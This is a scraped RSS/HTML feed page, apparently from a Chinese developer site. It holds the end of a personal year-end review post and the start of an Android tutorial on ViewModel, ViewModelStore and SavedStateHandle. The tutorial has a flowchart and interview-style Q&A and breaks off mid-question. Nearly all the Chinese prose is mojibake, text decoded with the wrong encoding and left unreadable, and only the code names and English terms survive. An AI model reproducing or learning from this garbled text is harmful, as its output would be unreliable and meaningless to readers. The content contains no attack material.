<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9e622e21ed94f499d81cb9bdb334f73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=gg4IcIjb96ua2DPhqWC82kWnuSY%3D" alt="" loading="lazy"/></p>
<p><strong>é—®ï¼šä»ä¸Šæµ·ä¸Šå¸‚å…¬å¸è·³åˆ°æ·±åœ³ï¼Œä¸­é—´è¿˜ç»å†äº†è¯•ç”¨æœŸç¦»èŒï¼Œå½“æ—¶å¿ƒæ€å´©è¿‡å—ï¼Ÿ</strong> <strong>ç­”ï¼š</strong> å´©è¿‡ï¼Œå°¤å…¶æ˜¯ä¸ƒæœˆç¦»èŒé‚£é˜µå­ï¼Œä¹‹åæ‰¾å·¥ä½œçš„æ— åŠ›æ„Ÿï¼Œçœ‹ç€åŒé¾„äººéƒ½åœ¨æ™’è½¬æ­£åˆç…§ï¼Œè€Œæˆ‘è‡ªå·±å´åœ¨æ‹–ç€è¡Œæç®±åˆ°å¤„è·‘ã€‚ä½†ç°åœ¨å›å¤´çœ‹ï¼Œé‚£æ˜¯2025å¹´ç»™æˆ‘çš„ç¬¬ä¸€è¯¾ï¼š<strong>ä¸åˆé€‚è¦è¶æ—©æ’¤ã€‚</strong> ç°åœ¨çš„955å…¬å¸è®©æˆ‘æœ‰ç²¾åŠ›å»å¹²å…¶ä»–äº‹ï¼ˆå»çˆ¬å±±ã€å»æå¸¦è´§ï¼‰ï¼Œå¦‚æœå½“æ—¶æ­»ç£•åœ¨é‚£ï¼Œå¯èƒ½ç°åœ¨æˆ‘åªæ˜¯ä¸ªå£åèŠ¬èŠ³çš„ç‰›é©¬æ‰“å·¥äººã€‚</p>
<p><strong>é—®ï¼šæˆ‘çœ‹ä½ 10æœˆä¹°äº†å½±çŸ³360åšæŠ–éŸ³è¿˜æ²¡æèµ·æ¥ï¼Œè¿™æ³¢ç®—ä¸ç®—â€œè®¾å¤‡å…šâ€äº¤äº†æ™ºå•†ç¨ï¼Ÿ</strong> <strong>ç­”ï¼š</strong> å“ˆå“ˆï¼ŒçœŸä¸è‡³äºã€‚è™½ç„¶æŠ–éŸ³ç°åœ¨è¿˜æ˜¯ä¸€æ½­æ­»æ°´ï¼Œä½†ä¹°äº†ç›¸æœºä¹‹åï¼Œæˆ‘ç¡®å®æ›´æ„¿æ„å‡ºé—¨ç¤¾äº¤å’Œè®°å½•äº†ã€‚ä»¥å‰å‡ºé—¨æ˜¯â€œä¸ºäº†èµ°è€Œèµ°â€ï¼Œç°åœ¨ä¼šå»æ€è€ƒç”»é¢ã€æ„å›¾ã€‚è¿™å‡ åƒå—é’±å¯¹æˆ‘æ¥è¯´ä¸æ˜¯æ™ºå•†ç¨ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä¸“é—¨å†™äº†ä¸€ä»½2026å¹´å®ç°æ¸…å•ï¼Œç”¨æ¥å»å°è¯•åšæˆ‘ä¹‹å‰æœªåšè¿‡çš„äº‹ï¼Œ26å¹´æ¥ç€æŠ˜è…¾å‘—ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153524834f8440e89a5312b835bde143~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=KUFsiDBahDdJ%2BSPZs6T%2BVLdJyJE%3D" alt="" loading="lazy"/></p>
<p><strong>é—®ï¼š2025å¹´ä½ æœ€å¤§çš„é—æ†¾æ˜¯ä»€ä¹ˆï¼Ÿ</strong> <strong>ç­”ï¼š</strong> æœ€å¤§çš„é—æ†¾å¯èƒ½å°±æ˜¯åœ¨æ ¡å›­æœŸé—´æ²¡æœ‰å»è°ˆä¸€æ®µçœŸæ­£æ„ä¹‰çš„æ ¡å›­æ‹çˆ±å§ã€‚è€ç²‰éƒ½çŸ¥é“ï¼Œæˆ‘å¤§å­¦å‡ å¹´å¿™ç€å†…å·ã€å­¦ä¹ ã€æ‰¾å·¥ä½œï¼Œå®Œå…¨æ²¡ç»™è‡ªå·±ç•™ç§ç”Ÿæ´»çš„æ—¶é—´ã€‚æ¯•ä¸šåçœ‹èº«è¾¹äººé™†ç»­è„±å•ï¼Œç¡®å®æœ‰ç‚¹é…¸ã€‚å¸Œæœ›2026å¹´ï¼Œä¹Ÿèƒ½é‡åˆ°æˆ‘çš„â€œè’™å¨œä¸½èâ€ã€‚</p>
<h2 data-id="heading-7"><strong>å…«ã€æœ€å</strong></h2>
<p>2025å¹´ï¼Œæˆ‘ä»å­¦ç”Ÿå˜æˆäº†åšä¸»ï¼Œä»ä¸Šæµ·æ¼‚åˆ°äº†æ·±åœ³ã€‚ æˆ‘ä¸è§‰å¾—25å±Šæ˜¯â€œæœ€éš¾çš„ä¸€å±Šâ€ï¼Œæˆ‘è§‰å¾—æˆ‘ä»¬æ˜¯â€œæœ€èƒ½æŠ˜è…¾çš„ä¸€å±Šâ€ã€‚ 2026ï¼Œå’±ä¸æ±‚å¤§å¯Œå¤§è´µï¼Œåªæ±‚è¿™è‚¡å­æŠ˜è…¾åŠ²åˆ«ç†„ç­ã€‚ æˆ‘æ˜¯è¿½ï¼Œæˆ‘ä»¬2026è§ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3de6a78dd9344c8e9e4c2aa410d1de73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=7YX2RTAhCqoAdnZvTzdNV56Wdbc%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£Android ViewModelå’ŒSavedStateHandle]]></title>    <link>https://juejin.cn/post/7602205524719222818</link>    <guid>https://juejin.cn/post/7602205524719222818</guid>    <pubDate>2026-02-03T11:33:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602205524719222818" data-draft-id="7602225961095675938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£Android ViewModelå’ŒSavedStateHandle"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-02-03T11:33:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yen"/> <meta itemprop="url" content="https://juejin.cn/user/4037062426633214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£Android ViewModelå’ŒSavedStateHandle
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062426633214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T11:33:12.000Z" title="Tue Feb 03 2026 11:33:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ViewModel</h2>
<p>ViewModel çš„æ ¸å¿ƒåŸç†æ˜¯<strong>é€šè¿‡ä¸€ä¸ªç‹¬ç«‹äºUIï¼ˆActivity/Fragmentï¼‰ç”Ÿå‘½å‘¨æœŸçš„å®¹å™¨ï¼Œæ¥å­˜å‚¨å’Œç®¡ç†ç•Œé¢æ‰€éœ€çš„æ•°æ®</strong>ã€‚å…¶è®¾è®¡çš„ç²¾é«“åœ¨äº<strong>æ•°æ®ä¸UIç”Ÿå‘½å‘¨æœŸçš„åˆ†ç¦»</strong>ï¼Œç”±Â <code>ViewModelStore</code>Â è´Ÿè´£åœ¨å±å¹•æ—‹è½¬ç­‰é…ç½®å˜æ›´æ—¶ä¿ç•™æ•°æ®ã€‚</p>
<p>ä¸‹é¢è¿™å¼ æµç¨‹å›¾æ¸…æ™°åœ°å±•ç¤ºäº† ViewModel çš„åˆ›å»ºã€å­˜å‚¨å’Œç”Ÿå‘½å‘¨æœŸç®¡ç†çš„æ ¸å¿ƒæœºåˆ¶ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Activity/Fragment é¦–æ¬¡åˆ›å»º] --&gt; B[åˆå§‹åŒ– ViewModelStore]
    B --&gt; C[é€šè¿‡ ViewModelProvider.get è¯·æ±‚ ViewModel]
    
    C --&gt; D{"ViewModelStore ä¸­&lt;br&gt;æ˜¯å¦å­˜åœ¨å®ä¾‹ï¼Ÿ"}
    D -- æ˜¯ --&gt; E[è¿”å›å·²å­˜åœ¨çš„å®ä¾‹]
    D -- å¦ --&gt; F[é€šè¿‡ Factory åˆ›å»ºæ–°å®ä¾‹]
    F --&gt; G[å­˜å…¥ ViewModelStore å¹¶è¿”å›]
    
    E --&gt; H[å±å¹•æ—‹è½¬ç­‰é…ç½®å˜æ›´]
    G --&gt; H
    
    subgraph Z[é…ç½®å˜æ›´æœŸé—´]
        H --&gt; I["Activity è¢«é”€æ¯ï¼Œä½†&lt;br&gt;ViewModelStore è¢«ç³»ç»Ÿä¿ç•™"]
        I --&gt; J[æ–°çš„ Activity å®ä¾‹è¢«åˆ›å»º&lt;br&gt;å¹¶æ¥æ”¶åˆ°ä¿ç•™çš„ ViewModelStore]
    end
    
    J --&gt; C
    
    K["Activity çœŸæ­£é”€æ¯&lt;br&gt;ï¼ˆå¦‚è¿”å›æˆ–é€€å‡ºï¼‰"] --&gt; L[ViewModelStore.clear&lt;br&gt;è§¦å‘æ‰€æœ‰ ViewModel.onCleared]
</code></pre>
<h3 data-id="heading-1">æ ¸å¿ƒåŸç†æ·±åº¦è§£æ</h3>
<p>ç†è§£ä¸Šå›¾ä¸­çš„å‡ ä¸ªæ ¸å¿ƒç»„ä»¶æ˜¯å…³é”®ï¼š</p>
<ul>
<li><strong>ViewModelStore</strong>: å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œå®ƒæ˜¯ä¸€ä¸ªç®€å•çš„é”®å€¼å¯¹å®¹å™¨ï¼ˆå†…éƒ¨æ˜¯Â <code>HashMap</code>ï¼‰ï¼Œæ˜¯ ViewModel å®ä¾‹çš„â€œå‚¨è—å®¤â€ã€‚å®ƒçš„ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼Œå½“ Activity å› é…ç½®å˜æ›´è¢«é”€æ¯é‡å»ºæ—¶ï¼Œå®ƒä¼šè¢«ç³»ç»Ÿé€šè¿‡Â <code>onRetainNonConfigurationInstance()</code>Â æœºåˆ¶ä¸´æ—¶ä¿ç•™ä¸‹æ¥ï¼Œå¹¶ä¼ é€’ç»™æ–°çš„ Activity å®ä¾‹ï¼Œä»è€Œå®ç° ViewModel çš„â€œå­˜æ´»â€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F01%2F13%2Funderstanding-viewmodel-persistence-across-configuration-changes-in-android%2F" target="_blank" title="https://www.droidcon.com/2025/01/13/understanding-viewmodel-persistence-across-configuration-changes-in-android/" ref="nofollow noopener noreferrer"/>ã€‚</li>
<li><strong>ViewModelProvider</strong>: è¿™æ˜¯è·å– ViewModel çš„ç»Ÿä¸€å…¥å£ã€‚å®ƒéµå¾ªÂ  <strong>â€œget-or-createâ€</strong> Â æ¨¡å¼ï¼šå½“ä½¿ç”¨Â <code>ViewModelProvider(owner).get(MyViewModel::class.java)</code>Â æ—¶ï¼Œå®ƒä¼šå…ˆä»¥ç±»çš„è§„èŒƒåç§°ä¸º Keyï¼Œå»å±äºÂ <code>owner</code>ï¼ˆå¦‚ Activityï¼‰çš„Â <code>ViewModelStore</code>Â ä¸­æŸ¥æ‰¾ï¼›å¦‚æœæ‰¾åˆ°å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æ‰¾åˆ°åˆ™é€šè¿‡Â <code>Factory</code>Â åˆ›å»ºå¹¶å­˜å…¥Â <code>ViewModelStore</code><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/>ã€‚</li>
<li><strong>viewModelScope</strong>: è¿™æ˜¯ ViewModel çš„ä¸€ä¸ª Kotlin æ‰©å±•å±æ€§ï¼Œå®ƒç»‘å®šäº†ä¸€ä¸ªä¸ ViewModel ç”Ÿå‘½å‘¨æœŸä¸€è‡´çš„åç¨‹ä½œç”¨åŸŸã€‚å½“ ViewModel è¢«æ¸…é™¤æ—¶ï¼ˆ<code>onCleared()</code>ï¼‰ï¼Œæ­¤ä½œç”¨åŸŸå†…çš„æ‰€æœ‰åç¨‹ä¼šè‡ªåŠ¨å–æ¶ˆï¼Œæœ‰æ•ˆé¿å…äº†å†…å­˜æ³„æ¼å’Œåå°ä»»åŠ¡ç§¯å‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F12%2F12%2Fviewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2%2F" target="_blank" title="https://www.droidcon.com/2025/12/12/viewmodelscope-internals-a-deep-dive-into-androids-threading-magic-2/" ref="nofollow noopener noreferrer"/>ã€‚</li>
</ul>
<h3 data-id="heading-2">ğŸ—ï¸ ViewModel åœ¨æ¶æ„ä¸­çš„è§’è‰²ä¸åä½œ</h3>
<p>ViewModel æ˜¯Â <strong>MVVMï¼ˆModel-View-ViewModelï¼‰</strong> Â æ¶æ„æ¨¡å¼çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£è¿æ¥Â <strong>Viewï¼ˆUIï¼‰</strong> Â å’ŒÂ <strong>Modelï¼ˆæ•°æ®å±‚/ä¸šåŠ¡é€»è¾‘ï¼‰</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fandroid-course.cornellappdev.com%2Fchapters%2F7.-mvvm-design-pattern%2F7.1-key-idea" target="_blank" title="https://android-course.cornellappdev.com/chapters/7.-mvvm-design-pattern/7.1-key-idea" ref="nofollow noopener noreferrer"/>ã€‚</p>
<ul>
<li>
<p><strong>èŒè´£åˆ’åˆ†</strong>:</p>
<ul>
<li><strong>View (UIæ§åˆ¶å™¨)</strong> : ä»…è´Ÿè´£æ˜¾ç¤ºæ•°æ®å’Œæ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œä¸å¤„ç†ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li><strong>ViewModel</strong>: è´Ÿè´£ä¸º View å‡†å¤‡å’Œæš´éœ² UI æ‰€éœ€çš„æ•°æ®çŠ¶æ€ï¼ˆStateï¼‰ï¼Œå¹¶å¤„ç†æ¥è‡ª View çš„ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼Œå‘ Model å±‚å‘èµ·è¯·æ±‚ã€‚</li>
<li><strong>Model</strong>: è´Ÿè´£æ•°æ®è·å–å’ŒæŒä¹…åŒ–ï¼ˆå¦‚æ•°æ®åº“ã€ç½‘ç»œï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®æµ</strong>: é€šå¸¸éµå¾ª<strong>å•å‘æ•°æ®æµ</strong>åŸåˆ™<a href="https://link.juejin.cn?target=https%3A%2F%2Fandroid-course.cornellappdev.com%2Fchapters%2F7.-mvvm-design-pattern%2F7.1-key-idea" target="_blank" title="https://android-course.cornellappdev.com/chapters/7.-mvvm-design-pattern/7.1-key-idea" ref="nofollow noopener noreferrer"/>ï¼š</p>
<ol>
<li><strong>çŠ¶æ€ä¸‹è¡Œ</strong>ï¼šModel æä¾›æ•°æ® -&gt; ViewModel åŠ å·¥ä¸º UI çŠ¶æ€ -&gt; View è§‚å¯Ÿå¹¶æ¸²æŸ“ã€‚</li>
<li><strong>äº‹ä»¶ä¸Šè¡Œ</strong>ï¼šView è§¦å‘ç”¨æˆ·äº‹ä»¶ -&gt; ViewModel å¤„ç† -&gt; å¿…è¦æ—¶é€šçŸ¥ Model æ›´æ–°æ•°æ®ã€‚</li>
</ol>
</li>
<li>
<p><strong>ä¸ LiveData/StateFlow çš„åä½œ</strong>ï¼š<br/>
ViewModel å†…éƒ¨é€šå¸¸ä½¿ç”¨Â <code>MutableLiveData</code>Â æˆ–Â <code>MutableStateFlow</code>Â æ¥æŒæœ‰å¯å˜çš„ UI çŠ¶æ€ï¼Œä½†å¯¹å¤–ä»…æš´éœ²å…¶åªè¯»ç‰ˆæœ¬ï¼ˆ<code>LiveData</code>Â æˆ–Â <code>StateFlow</code>ï¼‰ã€‚è¿™æ ·æ—¢ä¿è¯äº†æ•°æ®å¯è¢«è§‚å¯Ÿï¼Œåˆå°è£…äº†ä¿®æ”¹æƒï¼Œç¡®ä¿æ•°æ®å˜åŒ–åªèƒ½é€šè¿‡ ViewModel çš„ç‰¹å®šæ–¹æ³•è¿›è¡Œï¼Œç¬¦åˆå•å‘æ•°æ®æµã€‚</p>
</li>
</ul>
<h3 data-id="heading-3">ğŸ’¡ è¦ç‚¹è¯¦è§£</h3>
<h4 data-id="heading-4">åŸºç¡€ä¸åŸç†ç±»</h4>
<ul>
<li>
<p><strong>ViewModel æ˜¯ä»€ä¹ˆï¼Ÿè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong></p>
<blockquote>
<p>ViewModel æ˜¯ä¸€ä¸ª<strong>ç”Ÿå‘½å‘¨æœŸæ„ŸçŸ¥</strong>çš„ç»„ä»¶ï¼Œç”¨äºä»¥<strong>ç»“æ„åŒ–</strong>çš„æ–¹å¼å­˜å‚¨å’Œç®¡ç†ä¸ UI ç›¸å…³çš„æ•°æ®ã€‚å®ƒ<strong>æ ¸å¿ƒè§£å†³äº†</strong>å±å¹•æ—‹è½¬ç­‰é…ç½®å˜æ›´å¯¼è‡´çš„æ•°æ®ä¸¢å¤±é—®é¢˜ï¼ŒåŒæ—¶å¸®åŠ©å®ç°äº† UI æ§åˆ¶å™¨ï¼ˆActivity/Fragmentï¼‰ä¸ä¸šåŠ¡é€»è¾‘çš„<strong>å…³æ³¨ç‚¹åˆ†ç¦»</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_34358193%2Farticle%2Fdetails%2F141685543" target="_blank" title="https://blog.csdn.net/qq_34358193/article/details/141685543" ref="nofollow noopener noreferrer"/>ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel å¦‚ä½•åœ¨å±å¹•æ—‹è½¬åå­˜æ´»ï¼Ÿ</strong></p>
<blockquote>
<p>å…¶æ ¸å¿ƒæœºåˆ¶æ˜¯Â <strong><code>ViewModelStore</code></strong>ã€‚é…ç½®å˜æ›´æ—¶ï¼ŒActivity è¢«é”€æ¯ï¼Œä½†Â <code>ViewModelStore</code>Â ä¼šè¢«ç³»ç»Ÿé€šè¿‡Â <code>onRetainNonConfigurationInstance()</code>Â æœºåˆ¶ä¸´æ—¶ä¿ç•™ä¸‹æ¥ã€‚æ–°çš„ Activity å®ä¾‹åˆ›å»ºåï¼Œä¼šæ¥æ”¶åˆ°åŒä¸€ä¸ªÂ <code>ViewModelStore</code>ï¼Œä»è€Œè·å–åˆ°é‡Œé¢ä¿å­˜çš„ ViewModel å®ä¾‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.droidcon.com%2F2025%2F01%2F13%2Funderstanding-viewmodel-persistence-across-configuration-changes-in-android%2F" target="_blank" title="https://www.droidcon.com/2025/01/13/understanding-viewmodel-persistence-across-configuration-changes-in-android/" ref="nofollow noopener noreferrer"/>ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel å’ŒÂ <code>onSaveInstanceState()</code>Â çš„åŒºåˆ«ï¼Ÿ</strong></p>
<blockquote>
<p>è¿™æ˜¯ç»å…¸é¢è¯•é¢˜ã€‚ä¸»è¦åŒºåˆ«åœ¨äºæ•°æ®å¤§å°ã€å­˜å‚¨ä½ç½®å’Œç”¨é€”<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>ï¼š</p>
<ul>
<li><strong><code>onSaveInstanceState()</code></strong> : ç”¨äºä¿å­˜<strong>å°‘é‡ã€å¯åºåˆ—åŒ–</strong>çš„ UI çŠ¶æ€ï¼ˆå¦‚æ–‡æœ¬æ¡†å†…å®¹ï¼‰ï¼Œä»¥åº”å¯¹<strong>ç³»ç»Ÿå†…å­˜ä¸è¶³ã€è¿›ç¨‹è¢«æ€</strong>åæ¢å¤çš„åœºæ™¯ã€‚æ•°æ®ä¼šåºåˆ—åŒ–åˆ°ç£ç›˜ã€‚</li>
<li><strong>ViewModel</strong>: ç”¨äºå­˜å‚¨å’Œç®¡ç†<strong>ç›¸å¯¹è¾ƒå¤§ã€ä¸å¯åºåˆ—åŒ–</strong>çš„ UI æ•°æ®ï¼ˆå¦‚ç”¨æˆ·åˆ—è¡¨ã€ç½‘ç»œè¯·æ±‚ç»“æœï¼‰ï¼Œä»…åœ¨<strong>åŒä¸€è¿›ç¨‹å†…çš„é…ç½®å˜æ›´</strong>ï¼ˆå¦‚æ—‹è½¬ï¼‰æ—¶å­˜æ´»ã€‚æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚</li>
</ul>
</blockquote>
</li>
</ul>
<h4 data-id="heading-5">ä½¿ç”¨ä¸è¿›é˜¶ç±»</h4>
<ul>
<li>
<p><strong>å¦‚ä½•æ­£ç¡®åˆ›å»º ViewModelï¼Ÿä¸ºä½•ä¸èƒ½ç›´æ¥Â <code>new</code>ï¼Ÿ</strong></p>
<blockquote>
<p>å¿…é¡»é€šè¿‡Â <code>ViewModelProvider</code>Â æ¥è·å–å®ä¾‹ã€‚å¦‚æœç›´æ¥Â <code>new</code>ï¼Œåˆ›å»ºçš„ ViewModel æ— æ³•ä¸å½“å‰ç”Ÿå‘½å‘¨æœŸçš„æ‰€æœ‰è€…ï¼ˆå¦‚ Activityï¼‰å…³è”ï¼Œæ—¢æ— æ³•åœ¨é…ç½®å˜æ›´æ—¶ä¿ç•™ï¼Œå…¶Â <code>viewModelScope</code>Â ä¹Ÿæ— æ³•æ­£ç¡®é”€æ¯ï¼Œä¼šå¯¼è‡´å†…å­˜æ³„æ¼<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fgitblog_00191%2Farticle%2Fdetails%2F153245612" target="_blank" title="https://blog.csdn.net/gitblog_00191/article/details/153245612" ref="nofollow noopener noreferrer"/>ã€‚</p>
</blockquote>
</li>
<li>
<p><strong>ViewModel å¯ä»¥æŒæœ‰ Context å—ï¼Ÿ</strong></p>
<blockquote>
